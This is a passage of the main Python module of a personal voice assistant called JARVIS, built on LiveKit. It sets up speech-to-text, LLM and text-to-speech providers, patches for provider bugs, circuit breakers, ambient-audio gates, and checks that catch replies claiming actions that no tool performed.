"""
JARVIS voice agent — LiveKit worker.

Connects to the local LiveKit SFU as a Python worker. When any client
joins a room, this worker spawns a job, sets up the voice pipeline
(Silero VAD → Groq Whisper STT → Groq Llama LLM → Groq Orpheus TTS),
and holds a conversation over WebRTC.

Architecture:
    Tauri webview / Android client  ──(WebRTC audio)──▶  LiveKit SFU
                                                            ▲
                                                            │ joins as
                                                            │ a peer
                                                            ▼
                                                       this process

All audio DSP (AEC, NS, jitter buffer) is handled by the WebRTC stack
at each end — we do not run Silero in the browser anymore. VAD below
runs server-side, on the decoded frames the SFU forwards us, which is
why reliability improves dramatically vs the previous pipeline.

Run modes:
    python jarvis_agent.py dev       # local, verbose, file-watch
    python jarvis_agent.py start     # production (systemd uses this)
    python jarvis_agent.py download-files  # pre-fetch Silero weights

Env (from .env alongside this file, loaded by systemd unit):
    LIVEKIT_URL         ws://127.0.0.1:7880  (or ws://<tailscale-ip>:7880)
    LIVEKIT_API_KEY     matches livekit.yaml keys block
    LIVEKIT_API_SECRET  matches livekit.yaml keys block
    GROQ_API_KEY        required for STT/LLM/TTS via Groq
"""
from __future__ import annotations

import asyncio
import logging
import os
import platform
import re
import subprocess as _subprocess
import time
import urllib.error
import urllib.request
import uuid
from pathlib import Path

from livekit import agents
from livekit.agents import (
    Agent,
    AgentSession,
    ChatContext,
    ChatMessage,
    JobContext,
    JobProcess,
    StopResponse,
    WorkerOptions,
    cli,
    function_tool,
    tts,
)
from providers import edge_tts as edge_tts_plugin
# RoomOptions isn't re-exported from the top-level `livekit.agents`
# module — it lives under the voice room_io submodule. Import
# directly to dodge the ImportError.
from livekit.agents.voice.room_io import RoomOptions

# Load env BEFORE any provider client is constructed.
# Priority chain (lowest → highest), each layer overrides the previous:
#   1) Repo-root .env  — centralized LLM provider keys
#      (GROQ/DEEPSEEK/GOOGLE/etc., consolidated 2026-05-15).
#      systemd EnvironmentFile= also loads repo files, but the explicit
#      load here ensures `python jarvis_agent.py` (pytest, ad-hoc runs)
#      sees the keys without depending on systemd.
#   2) ~/.jarvis/keys.env — user override (Tray UI writes/clears here).
#      Always wins on collision so a user-set key beats the repo default.
# Missing files at any layer are fine — graceful no-op.
def _load_user_keys_env() -> None:
    import os
    from pathlib import Path

    def _parse(p: Path) -> None:
        for line in p.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip().strip('"').strip("'")
            if k and v:
                os.environ[k] = v

    # parents[2] = src/voice-agent → src → repo root
    sources = [
        Path(__file__).resolve().parents[2] / ".env",
        Path.home() / ".jarvis" / "keys.env",
    ]
    for src in sources:
        if not src.exists():
            continue
        try:
            _parse(src)
        except Exception as _e:
            # Logger isn't bound yet at this point in module init; use
            # the root logger so the failure is observable when DEBUG
            # logging is enabled. Failure here means the file exists
            # but is unparseable (perm error, malformed line, etc.).
            logging.getLogger("jarvis.config").warning(
                f"[env-load] {src.name} parse failed (non-fatal): {_e}"
            )

_load_user_keys_env()


def _apply_voice_mode() -> None:
    """Read ~/.jarvis/voice-mode and, when 'local', flip STT + LLM + TTS to
    on-device (faster-whisper + qwen3 + Kokoro) by setting the JARVIS_LOCAL_*
    env BEFORE the stacks are built. The desktop tray's Local/Cloud toggle
    writes this file; 'cloud' / absent = the normal cloud stack. Values are
    FORCED (not setdefault) so local mode is the known-good validated stack and
    overrides any global default (e.g. .env's JARVIS_LOCAL_LLM_MODEL=auto, which
    resolves to a weaker model than the qwen3 voice pick)."""
    try:
        mode = (Path.home() / ".jarvis" / "voice-mode").read_text(
            encoding="utf-8"
        ).strip().lower()
    except Exception:
        return
    if mode != "local":
        return

    def _cfg(_name: str, _default: str) -> str:
        """Read a single-line ~/.jarvis/<name> override (tray-written), else default."""
        try:
            _val = (Path.home() / ".jarvis" / _name).read_text(encoding="utf-8").strip()
            return _val or _default
        except Exception:
            return _default

    for _k, _v in {
        "JARVIS_LOCAL_STT_ENABLED": "1",
        "JARVIS_LOCAL_STT_PRIMARY": "1",
        # Fixed to faster-whisper large-v3 (the user's pick — most accurate).
        # No size option anymore; the tray STT-model picker was removed.
        "JARVIS_LOCAL_STT_MODEL":   "large-v3",
        "JARVIS_LOCAL_TTS_ENABLED": "1",
        "JARVIS_LOCAL_TTS_ENGINE":  "kokoro",
        "JARVIS_LOCAL_TTS_URL":     "http://127.0.0.1:8880/v1",
        "JARVIS_LOCAL_TTS_VOICE":   _cfg("voice-tts-voice", "af_heart"),
        "JARVIS_LOCAL_TTS_PRIMARY": "1",
        "JARVIS_LOCAL_LLM_ENABLED": "1",
        "JARVIS_LOCAL_LLM_URL":     "http://127.0.0.1:11434/v1",
        "JARVIS_LOCAL_LLM_MODEL":   "qwen3:30b-a3b",
    }.items():
        os.environ[_k] = _v
    logging.getLogger("jarvis.config").info(
        "[voice-mode] LOCAL - STT=faster-whisper, LLM=qwen3:30b-a3b, TTS=kokoro"
    )


_apply_voice_mode()

from livekit.plugins import openai as lk_openai, silero
# ElevenLabs removed 2026-05-01 — see _build_dispatching_tts comment.

# Round-trip DeepSeek's reasoning_content field. livekit-plugins-openai
# 1.5.x doesn't track it, which makes V4-flash / V4-pro reject any
# multi-turn request whose prior assistant message contained tool_calls
# (HTTP 400 "reasoning_content must be passed back"). install() patches
# inference.llm._parse_choice and provider_format.openai.to_chat_ctx;
# no-op for non-DeepSeek providers.
import sanitizers.deepseek_roundtrip as deepseek_roundtrip
deepseek_roundtrip.install()

# Strip image content blocks from OpenAI-format messages before they reach a
# TEXT-ONLY conversational model (DeepSeek/Groq/Kimi/local). An image_url block
# in chat_ctx 400s those providers NON-RETRYABLY ("unknown variant image_url,
# expected text"), which kills the inference task AND — because the image stays
# in history — bricks every subsequent turn (JARVIS acks then never returns the
# result). Patches the same provider_format.openai.to_chat_ctx chokepoint;
# Anthropic uses its own serializer so its vision path is untouched.
import sanitizers.image_content_strip as image_content_strip
image_content_strip.install()

# Backfill DeepSeek's `prompt_cache_hit_tokens` into the OpenAI-spec
# `prompt_tokens_details.cached_tokens` slot when the latter is empty.
# DeepSeek currently mirrors both fields, so the framework's stock
# extraction (livekit.agents.inference.llm.LLMStream._run line ~412)
# already captures cache hits — this patch is the defensive fallback
# for future DeepSeek API versions or DeepSeek-compatible third-party
# endpoints that drop the OpenAI mirror. Never overwrites a positive
# value; gates on base_url=deepseek.com so other providers' paths
# remain identical.
import sanitizers.deepseek_cache_tokens as deepseek_cache_tokens
deepseek_cache_tokens.install()

# Relax livekit-agents' strict-mode tool schema so defaulted Python
# params don't get added to `required`. Captures live 2026-05-05
# 17:13–17:14 UTC of `tool call validation failed: parameters for
# tool ext_new_tab did not match schema: errors: [missing properties:
# 'url']` even though `url: Optional[str] = None`. See module
# docstring for the full background.
import sanitizers.strict_schema_relax as strict_schema_relax
strict_schema_relax.install()

# Force `additionalProperties: false` on every nested object inside
# every Anthropic tool schema. Anthropic's /v1/messages endpoint
# rejects any tool whose object-typed sub-schema doesn't set this
# explicitly — captured live 2026-05-11 as `tools.0.custom: For
# 'object' type, additionalProperties must be explicitly set to
# false` on every supervisor turn while Claude Haiku 4.5 was the
# routed speech model. The strict_schema_relax patch above gives
# us legacy schemas (no additionalProperties anywhere), which is
# fine for Groq but a hard reject for Anthropic. This patch runs
# AFTER strict_schema_relax — it walks the schema tree produced
# by parse_function_tools('anthropic', ...) and sets the flag on
# every object node. Idempotent.
import sanitizers.anthropic_strict_schema as anthropic_strict_schema
anthropic_strict_schema.install()

# Recover from `tool call validation failed: attempted to call tool
# '<name> {<json>}' which was not in request.tools` — the recurring
# bug where some Groq models jam JSON args into the name field.
# install() catches the APIError, parses out the real name + args,
# and synthesizes a clean ChatChunk so the turn isn't lost.
import sanitizers.tool_name as tool_name_sanitizer
tool_name_sanitizer.install()

# Suppress + recover DeepSeek's DSML tool-call envelope when it leaks
# as plain text content. Without this, JARVIS reads the envelope
# markup ("<｜｜DSML｜｜tool_calls> <｜｜DSML｜｜invoke name=…>…") aloud
# verbatim — captured live 2026-05-01 17:38 on a weather lookup.
# Patches _parse_choice; stacks on top of deepseek_roundtrip's own
# patch of the same hook.
import sanitizers.dsml as dsml_sanitizer
dsml_sanitizer.install()

# Suppress tool-call-as-Python-text leaks (Groq llama-3.3-70b
# occasionally emits `browser_task_v2("...")  task_done(summary)`
# as content text instead of via the tool_calls field). Patches
# _parse_choice; stacks on top of dsml_sanitizer.
import sanitizers.pycall as pycall_sanitizer
pycall_sanitizer.install()

# Drop anticipatory text alongside transfer_to_*/delegate calls. The
# supervisor LLM sometimes emits a fake confirmation ("A new tab is
# open.") in the same turn as a handoff tool call — TTS plays
# the lie before the subagent runs. confab_detector blocks the DB
# save but TTS already streamed; this patches _parse_choice to blank
# delta.content from the moment a handoff is detected. Stacks on top
# of dsml_sanitizer + pycall_sanitizer.
import sanitizers.handoff_text
sanitizers.handoff_text.install()

# Phase 4 of memory-layer fix — output-rail denial detector. Watches
# supervisor text for memory-capability denials and blanks them
# before TTS. JARVIS-original sanitizer (no published precedent).
import sanitizers.denial_detector
sanitizers.denial_detector.install()

# Internal-phrase scrubber — blanks framework-only terminology
# (bailout phrases like "not a screen-share task", "handing back
# to supervisor", "wrong subagent", "user changed topic") from the
# assistant's voiced output. Last line of defense after task_done's
# own bailout-summary masking. Live failure 2026-05-11 16:42 UTC:
# user heard "not a screen-share task" voiced verbatim.
import sanitizers.internal_phrase
sanitizers.internal_phrase.install()

# Output-language sanitizer — blanks supervisor replies that drift
# into a non-Latin script when the user spoke English. Companion to
# pipeline/stt_gate.py's INPUT non-Latin gate; catches the rare case
# where a fallback model (DeepSeek v4-pro most notoriously) returns
# Cyrillic/Kana/Hanzi to a Latin-script English input. Live failure
# 2026-05-16 turn 160: user said "That's the" (3-word Latin) and got
# back a Bosnian formal-letter reply. Added 2026-05-17 per enterprise
# plan §P0-VOICE-2.
import sanitizers.output_language
sanitizers.output_language.install()

# Wrap LLM streams in asyncio.wait_for so stalled Groq connections
# raise TimeoutError after JARVIS_LLM_IDLE_TIMEOUT (default 30s)
# instead of hanging forever. Captured live 2026-05-02: subagent
# on_enter fired then 3+ minutes of dead air — connect-only timeout
# couldn't see the stall. Patches LLMStream._run; stacks on top of
# the other sanitizers.
import resilience.llm_idle_timeout
resilience.llm_idle_timeout.install()

# Defensive monkey-patch on livekit.rtc.Room to swallow KeyError on
# stale track SIDs during reconnect — installs in BOTH the voice-
# client process and the agent job subprocess (livekit-agents
# framework constructs its own Room before our entrypoint runs).
# See src/voice-agent/resilience/track_guard.py and spec
# 2026-05-04-jarvis-voice-resilience-design.md.
import resilience.track_guard as _track_guard
_track_guard.install()

# Turn rescue (2026-07-02): in echo-aware barge-in mode every speech is
# formally allow_interruptions=False, so a user turn completing during
# TTS was DISCARDED by the framework ("skipping reply to user input,
# current speech generation cannot be interrupted" — 808 drops in one
# day, incl. directed commands). The patch makes the speech interruptible
# when the completed transcript is NOVEL (non-echo, same check as the
# barge-in layer) so the framework's own interrupt-and-reply path runs;
# echo transcripts stay dropped. Kill-switch JARVIS_TURN_RESCUE_DISABLED=1.
import resilience.turn_rescue as _turn_rescue
_turn_rescue.install()

# ── Conversation persistence ──────────────────────────────────────────
# Every voice turn is persisted to ~/.jarvis/conversations.db (or
# $JARVIS_CONVERSATION_PATH) — see pipeline.conversation_store.
# Per-session lifecycle (begin_session / end_session / auto_title from
# first utterance) plus per-turn message logging with idempotent upsert.
# Recent-session summaries are injected into the system prompt at session
# start; deep lookup is available via the recall_conversation tool.
# turn_telemetry.db is a SEPARATE path covering per-turn metrics only.
#
# Persistence must NOT depend on the dispatcher being alive. Live
# incident 2026-07-01: `_jarvis_turn_count` is only incremented in the
# dispatcher swap paths (turn_dispatcher.py) / graph prefix node
# (turn_graph.py), and `_jarvis_turn_user_text` is stashed there too.
# A tray-pinned model + JARVIS_PIN_ALL_ROUTES=1 skips the dispatcher →
# count stuck at 0 → the persist gate never opened → zero messages all
# day (sessions/auto-title/telemetry unaffected, so it was invisible).
# These helpers read the dispatcher state AND a dispatcher-independent
# stash maintained by `_on_item` itself (`_jarvis_convo_seq`, bumped per
# user item; `_jarvis_convo_user_text`). max() keeps the sequence
# monotonic across mixed states so UNIQUE(session, role, seq) never
# silently drops a later turn as a "duplicate".


def _convo_turn_seq(session) -> int:
    """Turn sequence for conversations.db — dispatcher-independent."""
    return max(
        int(getattr(session, "_jarvis_turn_count", 0) or 0),
        int(getattr(session, "_jarvis_convo_seq", 0) or 0),
    )


def _convo_user_text(session) -> str:
    """This turn's user text — dispatcher stash first (raw transcript,
    no [Route] prefix), else the chat-item stash from `_on_item`."""
    return (
        getattr(session, "_jarvis_turn_user_text", "")
        or getattr(session, "_jarvis_convo_user_text", "")
        or ""
    )

# ── Memory layer (durable user-facts that survive chat deletion) ──────
# File-backed, deliberate-writes model. Two stores — MEMORY.md + USER.md
# under get_jarvis_home()/"memories" — are injected into the system
# prompt as a FROZEN snapshot at session start (see pipeline.file_memory).
# The supervisor writes via the single `memory` tool (tools.memory,
# registered into the registry surface). Spec:
# docs/superpowers/specs/2026-05-03-jarvis-memory-layer-design.md.
import tools.memory  # noqa: E402 — registers the `memory` tool at import
from pipeline import file_memory  # noqa: E402

# File-backed memory has no external dependency, so it's always available.
# Kept as a flag so the per-turn / session-start injection path can gate
# on it cheaply.
_MEMORY_AVAILABLE = tools.memory.is_available()
logging.getLogger("jarvis.memory_layer").info(
    f"memory layer {'enabled' if _MEMORY_AVAILABLE else 'disabled'} (file-backed)"
)

# ── Maya-class speech intelligence ────────────────────────────────────
from pipeline.turn_router    import (
    detect_emotion, classify_turn, AudioMeta,
    compute_speech_rate, update_baseline, compute_interrupt_tuning,
)
from pipeline.dispatching_llm import DispatchingLLM
from pipeline.dispatching_tts import DispatchingTTS
from pipeline.provider_errors import classify_provider_error
from pipeline.lang_context import LangContext
from pipeline.turn_telemetry import init_db, log_turn, log_launch_attempt, DEFAULT_DB_PATH
# Pre-TTS confab gate — inspects supervisor reply text BEFORE TTS streams
# and runs the per-route retry chain when a "no-tool but claimed action"
# confab is detected. Spec: docs/superpowers/specs/2026-05-24-pre-tts-confab-gate-design.md
from pipeline.pre_tts_confab_gate import (
    should_gate as _pre_tts_should_gate,
    run_retry_chain as _pre_tts_run_retry_chain,
    gate_disabled as _pre_tts_gate_disabled,
    telemetry_state_for_clean as _pre_tts_telemetry_clean,
    FILLER_TEXT as _PRE_TTS_FILLER_TEXT,
)
from pipeline.turn_telemetry import (
    CONFAB_STATE_BYPASSED_KILLED,                 # for gate-disabled telemetry
    CONFAB_STATE_CLEAN_BYPASS_ROUTE,              # set by fast-path for BANTER/EMOTIONAL
    CONFAB_STATE_RETRY_FACTORY_MISSING,           # gate tripped but no _jarvis_pre_tts_llm_factory
    CONFAB_STATE_RETRY_EXCEPTION,                 # retry chain raised — see logs
)

logger = logging.getLogger("jarvis")

# Shell + file tools now come from the registry tool-loading framework
# (tools/registry.py + tools/_adapter.py). load_all_livekit_tools()
# discovers every self-registered tool (terminal/read_file/write_file/
# patch/search_files) and adapts each into a RawFunctionTool. The
# result is spread into JarvisAgent's tools=[…] at construction.
from tools._adapter import load_all_livekit_tools

# NOTE: the supervisor's tool surface is now REGISTRY-ONLY (see the
# tools=load_all_livekit_tools() call at construction). The previously-
# restored JARVIS tool modules — screen_share_control.set_screen_share,
# skill_runner, plan_mode, tasks, ask_user_question, monitor, worktree,
# code_search — are no longer imported here: the pure-tool ones were
# deleted, and screen_share_control is used only by pipeline/intent_router
# (lazy-imported there, not a supervisor tool). They will be re-ported
# into the registry framework one wave at a time.


# ── Groq TTS error-body logging shim ──────────────────────────────────
# Diagnostic: the upstream livekit-plugins-groq adapter constructs
# APIStatusError with body=None on non-2xx, so /tmp/jarvis-voice-agent.log
# only shows "Bad Request" with no detail on what Groq actually rejected
# (voice name? model id? payload field?). Subclass the plugin's
# ChunkedStream to read and log resp.text() before raising the same
# error — preserves FallbackAdapter behaviour, just adds visibility.
# Remove once the underlying 400 is identified and fixed.
import aiohttp as _aiohttp
from livekit.agents import RunContext
from livekit.agents import APIConnectionError as _APIConnectionError
from livekit.agents import APIError as _APIError
from livekit.agents import APIStatusError as _APIStatusError
from livekit.agents import APITimeoutError as _APITimeoutError
from livekit.agents import utils as _lk_utils


# ── Per-upstream circuit breakers ────────────────────────────────────
# Three independent breakers gate the Groq endpoints. A DNS / API
# Per-upstream circuit breakers — singletons live in `resilience/__init__.py`
# (moved 2026-05-10 so provider classes splitting out of this file can
# import them without circular-import gymnastics). Aliased to the legacy
# underscored names so existing call sites (~24 of them in this file)
# are untouched.
from resilience.circuit_breaker import (
    CircuitOpenError,
    STATE_CLOSED,
    STATE_OPEN,
)
from resilience import (
    STT_BREAKER as _STT_BREAKER,
    TTS_BREAKER as _TTS_BREAKER,
    LLM_BREAKER as _LLM_BREAKER,
)


def _build_breaker_status_block(breakers: list | None = None) -> str:
    """Back-compat wrapper around `pipeline.prompt_builder.
    build_breaker_status_block` — defaults to the module's three
    breakers when called with no args (so on_user_turn_completed can
    call with no arg + tests/test_breaker_status_block.py keeps the
    original API)."""
    from pipeline.prompt_builder import build_breaker_status_block
    if breakers is None:
        breakers = [_STT_BREAKER, _TTS_BREAKER, _LLM_BREAKER]
    return build_breaker_status_block(breakers)


def _build_skill_catalog_block() -> str:
    """Return a compact skill-catalog block for injection into the
    supervisor system prompt.

    Built ONCE per session in _build_initial_prompt_state (alongside the
    memory and breaker blocks) — session-stable so the prefix cache stays
    warm. Returns "" when no skills are loaded (zero prompt cost).

    Reads from the module-level SKILLS registry populated at import by
    pipeline.skills_loader. The caller (test or _build_initial_prompt_state)
    can monkeypatch this function to inject a sentinel block.
    """
    from pipeline.prompt_builder import build_skill_catalog_block
    from pipeline.skills_loader import SKILLS
    return build_skill_catalog_block(SKILLS)


# Extracted to providers/stt.py 2026-05-10 (Step 5a of the 10/10
# refactor; the Groq Whisper STT class + breakered factory were removed
# 2026-06-29 in the full-Groq-eradication pass). build_stt_chain is
# re-exported under its legacy underscored name so call sites stay untouched.
from providers.stt import (
    build_stt_chain as _build_stt_chain,
)


# Extracted to providers/llm.py 2026-05-10 (Step 5b of the 10/10
# refactor). Re-exported under the legacy underscored name so the
# constructor call inside _BreakeredGroqLLM.chat + the two tests
# (test_breaker_shims.py + test_voice_fixes_2026_05_04.py) keep
# working unchanged.
from providers.llm import BreakeredLLMStream as _BreakeredLLMStream


# Extracted to providers/llm.py 2026-05-10 (Step 5c of the 10/10
# refactor). Re-exported under the legacy underscored names so the
# 4 in-file constructor sites (in `_build_dispatching_llm`), the
# telemetry read at line ~5000 (`_LAST_PREFLIGHT`), and the existing
# tests (test_token_prune_2026_05_08 imports prune + estimate helpers)
# stay untouched.
from providers.llm import (
    LAST_PREFLIGHT             as _LAST_PREFLIGHT,
    ctx_items_token_estimate   as _ctx_items_token_estimate,
    prune_chat_ctx_for_budget  as _prune_chat_ctx_for_budget,
)


# ── Quiet hours ───────────────────────────────────────────────────────
# OFF by default per user directive 2026-05-10: JARVIS should be
# active 24/7. Set JARVIS_QUIET_START / JARVIS_QUIET_END (integers,
# 0-23, local time) to re-enable a quiet window — when both are 0
# (the default) the gate skips entirely.
#
# When ON: between START and END (local time, 24h), ambient VAD
# picks up household noise and JARVIS acts on it (opening Spotify
# at 3am — confirmed 2026-04-27). The gate then requires either:
#   a) an explicit "Jarvis" vocative, OR
#   b) a recent real interaction (within QUIET_HOURS_WINDOW_SEC)
# Allowing normal multi-turn conversation while blocking idle
# ambient triggers. Wake phrases always pass.
#
# To re-enable the original 1am-6am window:
#   export JARVIS_QUIET_START=1 JARVIS_QUIET_END=6
QUIET_HOURS_START      = int(os.environ.get("JARVIS_QUIET_START",      "0"))    # OFF (was 1am)
QUIET_HOURS_END        = int(os.environ.get("JARVIS_QUIET_END",        "0"))    # OFF (was 6am)
QUIET_HOURS_WINDOW_SEC = float(os.environ.get("JARVIS_QUIET_WINDOW_SEC", "1200"))  # 20 min
# Addressing gate (2026-06-25): outside quiet hours JARVIS still answers ONLY
# when addressed — by the "Jarvis" vocative, a wake phrase, or an active
# conversation (a real interaction within this many seconds). Idle ambient room
# audio (the user talking to someone else, a TV, footsteps as they walk past) is
# dropped instead of answered with a continuer. Tighter than the night-time
# QUIET_HOURS_WINDOW_SEC so JARVIS doesn't keep answering ambient for 20 min
# after a chat. Kill-switch JARVIS_ADDRESSING_GATE=0 restores old always-answer.
ENGAGEMENT_WINDOW_SEC  = float(os.environ.get("JARVIS_ENGAGEMENT_WINDOW_SEC", "90"))  # active-conversation follow-up window
ADDRESSING_GATE_ON     = os.environ.get("JARVIS_ADDRESSING_GATE", "1") != "0"
# Vocative regexes — single source of truth in pipeline/vocative.py.
# Pre-2026-05-10 these were 3 separate regex compilations in this file
# kept in sync by hand-written line-number comments; that produced
# silent drift (e.g. quiet-hours guard dropping wake words after a
# variant was added to only one site). Now all 3 derive from one
# NAME_ALTERNATION constant. Add new STT variants in vocative.py.
from pipeline.wake_word import (
    NAME_RE          as _JARVIS_NAME_RE,
    BARE_VOCATIVE_RE as _BARE_VOCATIVE_RE,
    INLINE_STRIP_RE  as _INLINE_VOCATIVE_STRIP_RE,
)


# STT-confidence gate (transcript-shape filter) — extracted to
# pipeline/stt_gate.py 2026-05-10 (Step 9 of the audit). Re-exported
# under legacy underscored names so tests/test_stt_garbage_gate.py
# and the entrypoint call site stay untouched.
from pipeline.stt_gate import (
    FILLER_TOKENS           as _FILLER_TOKENS,
    WHISPER_HALLUCINATIONS  as _WHISPER_HALLUCINATIONS,
    is_garbage_transcript   as _is_garbage_transcript,
)

# High-confidence BANTER patterns. When the user's turn matches one of
# Fast-path classifier regexes — extracted to pipeline/fast_path_classifier.py
# 2026-05-10 (Step 9 of the audit). Re-exported under legacy underscored
# names so tests/test_banter_fast_path + test_reasoning_fast_path and the
# 4 in-file callers in the dispatch handler stay untouched.
from pipeline.fast_path_classifier import (
    BANTER_FAST_PATH_RE    as _BANTER_FAST_PATH_RE,
    REASONING_FAST_PATH_RE as _REASONING_FAST_PATH_RE,
)

# Tool-call leakage sanitization. When the speech LLM regresses and emits
# a tool call as TEXT inside content (e.g. `<function/bash{"command": ...}>`)
# instead of as a structured tool_call, the framework's dispatcher misses
# it (no execution) but the text gets persisted to chat history. On the
# next turn, the LLM sees its own leaked text as PRECEDENT and mimics —
# self-reinforcing loop where every tool call is leaked as text and
# nothing actually runs.
#
# Two-layer defense (per LiveKit PR #4999 + an upstream agent-framework
# pattern): (1) strip on WRITE so the in-memory chat_ctx and turn
# telemetry log never accept a leaked pattern going forward, (2) strip
# on RECALL so any historical leakage already present in chat_ctx is
# scrubbed before the next LLM call sees it. Each layer alone is
# insufficient: the write filter doesn't help items already in the
# context window; the recall filter doesn't stop fresh leaks from
# being persisted to turn_telemetry.db as if they were clean turns.
# Tool-leak / recall sanitization moved to pipeline/chat_ctx.py
# (Step 4 of the 10/10 refactor). Back-compat alias for the pre-write
# scrubber on assistant turns (lines below). The META/ARCHAIC regexes
# import further down so they live near their TTS post-scrubber call
# sites.
from pipeline.chat_ctx import sanitize_leaked_tool_text as _sanitize_leaked_tool_text
_last_real_interaction = 0.0     # monotonic timestamp of last accepted turn
_bg_tasks: set = set()  # keeps create_task refs alive until done


def _update_lang_from_stt_event(ctx: LangContext, ev) -> None:
    """Update a LangContext from a user_input_transcribed event.

    Handles three event-shape quirks:
      - language attr may be missing or None (some STT plugins don't
        surface it). Skip — keep previous lang.
      - confidence attr may be missing. Default 1.0 — accept the
        language since we have no signal to reject it.
      - language is anything truthy → pass through; LangContext's
        confidence floor handles low-confidence drops.
    """
    lang = getattr(ev, "language", None)
    if not lang:
        return
    conf = getattr(ev, "confidence", 1.0)
    try:
        ctx.set(lang, confidence=float(conf))
    except (TypeError, ValueError):
        ctx.set(lang)


def _in_quiet_hours() -> bool:
    if QUIET_HOURS_START == QUIET_HOURS_END:
        return False
    hour = time.localtime().tm_hour
    if QUIET_HOURS_START > QUIET_HOURS_END:
        return hour >= QUIET_HOURS_START or hour < QUIET_HOURS_END
    return QUIET_HOURS_START <= hour < QUIET_HOURS_END


def _touch_interaction() -> None:
    global _last_real_interaction
    _last_real_interaction = time.monotonic()


def _recent_interaction(window: float = QUIET_HOURS_WINDOW_SEC) -> bool:
    """True if a real interaction happened within `window` seconds — i.e. the
    user is mid-conversation, so a follow-up needs no "Jarvis" vocative."""
    return (time.monotonic() - _last_real_interaction) < window


def _is_unaddressed_ambient(text: str) -> bool:
    """Decide whether a transcript should be dropped as ambient room audio.

    True when the addressing gate is on, the text carries NO "Jarvis" vocative
    and NO wake phrase, AND there has been no real interaction within the
    engagement window (tighter by day via ENGAGEMENT_WINDOW_SEC, generous at
    night via QUIET_HOURS_WINDOW_SEC). Pure function of `text` + module state so
    the gate is unit-testable. Wired into on_user_turn_completed."""
    if not ADDRESSING_GATE_ON:
        return False
    if _JARVIS_NAME_RE.search(text) or _is_command(text, _WAKE_PATTERNS):
        return False  # explicitly addressed — always answer
    window = QUIET_HOURS_WINDOW_SEC if _in_quiet_hours() else ENGAGEMENT_WINDOW_SEC
    return not _recent_interaction(window)


# Ambient-backchannel suppressor (2026-07-02). With the addressing gate
# OFF (always-answer room, above), every overheard utterance reaches the
# LLM, which is trusted to return an EMPTY string on ambient audio
# (soul.md DISCRETION). Thinking-mode DeepSeek honored that; the
# non-thinking pin (45f43ada) instead voices a minimal filler — "Right." /
# "Mm." / "Yes?" — at the room, and each voiced filler lands in chat_ctx
# as precedent for the next turn to mimic (same self-reinforcing loop as
# the emote + tool-leak cases; live 2026-07-02: 0%→81% of turns within one
# session, token drifting Right.→Mm.→Yes?). Deterministic enforcement: a
# reply that is NOTHING BUT a filler token, answering a turn not addressed
# to JARVIS, is silenced before TTS. Contentful replies and addressed
# turns (vocative / wake phrase / live directed exchange) are untouched —
# bare "Jarvis" → "Yes?" survives. Kill-switch: JARVIS_BACKCHANNEL_GATE=0.
BACKCHANNEL_GATE_ON = os.environ.get("JARVIS_BACKCHANNEL_GATE", "1") != "0"
# Longest filler lemma is ~11 letters ("fair enough"); a stream past this
# length can never be a bare filler — flush early, zero latency cost.
_BACKCHANNEL_MAX_LEN = 24
# Matched against the normalized WHOLE reply (lowercase, letters+spaces
# only). Deliberately separate from stt_gate.FILLER_TOKENS — that set
# filters USER transcripts (different vocab + trust boundary).
_FILLER_LEMMAS = frozenset({
    "right", "mm", "mhm", "mmhm", "mm hm", "yeah", "yes", "yep", "yup",
    "sure", "got it", "ok", "okay", "hm", "hmm", "huh", "go on", "uh huh",
    "alright", "all right", "fair enough", "noted", "understood",
    "of course", "indeed",
})
_FILLER_NORM_RE = re.compile(r"[^a-z]+")


def _is_bare_filler_reply(text: str) -> bool:
    """True when the ENTIRE reply is one backchannel token ("Right." /
    "Mm." / "Yes?" / "Got it —"). Normalization keeps letters only, so
    punctuation / dash / case variants all collapse to the same lemma."""
    norm = _FILLER_NORM_RE.sub(" ", (text or "").lower()).strip()
    return bool(norm) and norm in _FILLER_LEMMAS


def _turn_is_addressed(user_text: str) -> bool:
    """Same directedness bar as _should_sync_memory_item: an explicit
    "Jarvis" vocative / wake phrase on THIS turn, or a live directed
    exchange (the addressed-window stamp, touched by every addressed
    turn in on_user_turn_completed)."""
    if user_text and (
        _JARVIS_NAME_RE.search(user_text) or _is_command(user_text, _WAKE_PATTERNS)
    ):
        return True
    return _within_addressed_window()


# Hedge phrases that the POST-HANDOFF HONESTY rule trains the
# supervisor to emit when it couldn't confirm tool success. Keep
# lowercase + substring-matched against ``jarvis_text.lower()``.
# Order doesn't matter — any match wins.
_CONFAB_HEDGE_PHRASES = (
    "couldn't confirm",
    "not sure that completed",
    "didn't go through",
    "couldn't verify",
    "tried but couldn't",
    "should i try again",
    "want me to check",
)


def compute_confab_check_state(
    *,
    session,
    chat_items: list,
    jarvis_text: str,
) -> str:
    """Compute the per-turn confab_check_state value for telemetry.

    Returns one of:
      "refused_handoff"     — session flag set by subagent gate refusal
      "evidence_ok"         — chat_ctx has a real tool_result / non-handoff
                              tool_call within the lookback window
      "hedged_no_evidence"  — jarvis_text matches a hedge phrase AND no
                              evidence
      "unchecked"           — fallback (BANTER/EMOTIONAL with no signals)

    Priority order: refused_handoff > evidence_ok > hedged_no_evidence >
    unchecked. Per spec 2026-05-19 §5.4."""
    # 1) Session-level refused-handoff flag (set by subagents/agent.py)
    if getattr(session, "_jarvis_last_handoff_refused", False):
        return "refused_handoff"

    # 2) Real tool evidence in chat_ctx.
    try:
        from confab_detector import has_recent_tool_evidence
        if has_recent_tool_evidence(chat_items, lookback=10):
            return "evidence_ok"
    except Exception:
        pass

    # 3) Hedge phrasing in jarvis_text → hedged_no_evidence.
    if jarvis_text:
        lowered = jarvis_text.lower()
        for p in _CONFAB_HEDGE_PHRASES:
            if p in lowered:
                return "hedged_no_evidence"

    # 4) Fallback — no signals to evaluate.
    return "unchecked"


def inject_handoff_refused_marker(session, chat_ctx) -> None:
    """When the subagent gate refused task_done on the prior handoff
    (``session._jarvis_last_handoff_refused == True``), inject a single
    system message into ``chat_ctx.items`` so the supervisor LLM can
    see it and apply the POST-HANDOFF HONESTY rule from supervisor.md.

    Clears the flag after injecting so the marker only fires once
    per gate-refusal event. Idempotent: re-calling after the flag
    is cleared is a no-op.

    Per spec 2026-05-19 §5.2 + T9 prompt rule. Closes the wiring gap
    that left the prompt rule unactionable — the LLM cannot read a
    Python attribute directly.
    """
    if not getattr(session, "_jarvis_last_handoff_refused", False):
        return
    marker_text = (
        "[POST-HANDOFF SIGNAL — Prior subagent handoff was REFUSED by "
        "the gate (no real tool fired this handoff). DO NOT claim the "
